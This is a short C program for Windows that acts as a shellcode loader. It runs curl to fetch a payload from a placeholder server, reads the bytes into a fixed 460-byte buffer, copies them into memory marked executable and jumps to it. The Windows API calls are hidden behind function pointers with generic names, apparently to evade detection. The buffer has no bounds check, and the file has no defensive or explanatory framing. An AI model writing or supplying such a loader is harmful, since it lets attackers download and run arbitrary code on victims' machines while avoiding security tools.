#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main() {
    FILE *(*f1)(const char *, const char *) = popen;
    size_t (*f2)(void *, size_t, size_t, FILE *) = fread;
    int (*f3)(FILE *) = pclose;
    void *(*f4)(LPVOID, SIZE_T, DWORD, DWORD) = VirtualAlloc;
    void *(*f5)(void *, const void *, size_t) = memcpy;

    FILE *fpipe;
    char *command = "curl yourServer/paylolad.bin";
    char c = 0;
    unsigned char code[460];
    int counter = 0;

    if (0 == (fpipe = (FILE*)f1(command, "r"))) {
        perror("popen() failed");
        exit(EXIT_FAILURE);
    }

    while (f2(&c, sizeof c, 1, fpipe)) {
        code[counter] = c;
        counter = counter + 1;
    }

    f3(fpipe);

    void *exec = f4(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    f5(exec, code, sizeof code);
    ((void(*)())exec)();
    return 0;
}
